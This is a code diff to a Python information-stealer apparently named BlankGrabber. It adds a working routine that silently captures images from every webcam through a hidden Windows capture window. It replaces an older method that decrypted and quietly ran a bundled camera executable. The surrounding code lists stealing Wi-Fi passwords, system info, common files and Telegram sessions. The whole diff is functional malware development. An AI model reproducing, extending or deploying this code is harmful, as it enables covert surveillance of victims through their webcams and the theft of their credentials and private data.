@@ -19,6 +19,7 @@ import ctypes
 import logging
 
 from threading import Thread
+from ctypes import wintypes
 from urllib3 import PoolManager, HTTPResponse
 
 class Settings:
@@ -171,7 +172,34 @@ class Tasks:
 class Syscalls:
 
     @staticmethod
+    def CaptureWebcam(index: int, filePath: str) -> bool:
+        avicap32 = ctypes.windll.avicap32
+        WS_CHILD = 0x40000000
+        WM_CAP_DRIVER_CONNECT = 0x0400 + 10
+        WM_CAP_DRIVER_DISCONNECT = 0x0402
+        WM_CAP_FILE_SAVEDIB = 0x0400 + 100 + 25
+
+        hcam = avicap32.capCreateCaptureWindowW(
+            wintypes.LPWSTR("Blank"),
+            WS_CHILD,
+            0, 0, 0, 0,
+            ctypes.windll.user32.GetDesktopWindow(), 0
+        )
+
+        result = False
+
+        if hcam:
+            if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_CONNECT, index, 0):
+                if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_FILE_SAVEDIB, 0, wintypes.LPWSTR(filePath)):
+                    result = True
+                ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_DISCONNECT, 0, 0)
+            ctypes.windll.user32.DestroyWindow(hcam)
+        
+        return result
+
+    @staticmethod
     def CreateMutex(mutex: str) -> bool:
+
         kernel32 = ctypes.windll.kernel32
         mutex = kernel32.CreateMutexA(None, False, mutex)
 
@@ -900,7 +928,7 @@ class BlankGrabber:
             (self.GetWifiPasswords, False),
             (self.StealSystemInfo, False),
             (self.TakeScreenshot, False),
-            (self.BlockSites, True),
+            (self.BlockSites, False),
             (self.Webshot, True),
             (self.StealCommonFiles, True)
         ):
@@ -1312,37 +1340,17 @@ class BlankGrabber:
 
     @Errors.Catch
     def Webshot(self) -> None: # Captures snapshot(s) from the webcam(s)
-        isExecutable = Utility.GetSelf()[1]
-        if not Settings.CaptureWebcam or not os.path.isfile(Camfile := os.path.join(sys._MEIPASS, 'Camera')):
-            return
-        
-        Logger.info("Capturing webcam snapshot")
+        if Settings.CaptureWebcam:
+            camdir = os.path.join(self.TempFolder, "Webcam")
+            os.makedirs(camdir, exist_ok= True)
 
-        with open(Camfile, 'rb') as file:
-            data = file.read()
-        data = pyaes.AESModeOfOperationCTR(b'f61QfygejoxUWGxI').decrypt(data)
-        if not b'This program cannot be run in DOS mode.' in data:
-            return
-        if isExecutable:
-            tempCam = os.path.join(sys._MEIPASS, 'Camera.exe')
-        else:
-            tempCam = os.path.join(os.getenv('temp'), 'Camera.exe')
-        with open(tempCam, 'wb') as file:
-            file.write(data)
-        tempCamPath = os.path.dirname(tempCam)
-        camlist = [x[15:] for x in subprocess.run('Camera.exe /devlist', capture_output= True, shell= True, cwd= tempCamPath).stdout.decode(errors= 'ignore').splitlines() if "Device name:" in x]
-        for index, name in enumerate(camlist):
-            try:
-                subprocess.run('Camera.exe /devnum {} /quiet /filename image.bmp'.format(index + 1), shell= True, stdout= open(os.devnull, 'w'), stderr= open(os.devnull, 'w'), cwd= tempCamPath, timeout= 5.0)
-            except subprocess.TimeoutExpired:
-                continue
-            if not os.path.isfile(tempImg := os.path.join(tempCamPath, 'image.bmp')):
-                continue
-            os.makedirs(webcamFolder := os.path.join(self.TempFolder, 'Webcam'), exist_ok= True)
-            shutil.copy(tempImg, os.path.join(webcamFolder, '%s.bmp' % name))
-            os.remove(tempImg)
-            self.WebcamPictures += 1
-        os.remove(tempCam)
+            camIndex = 0
+            while Syscalls.CaptureWebcam(camIndex, os.path.join(camdir, "Webcam %d.bmp" % (camIndex + 1))):
+                camIndex += 1
+                self.WebcamPictures += 1
+            
+            if self.WebcamPictures == 0:
+                shutil.rmtree(camdir)
     
     @Errors.Catch
     def StealTelegramSessions(self) -> None: # Steals telegram session(s) files
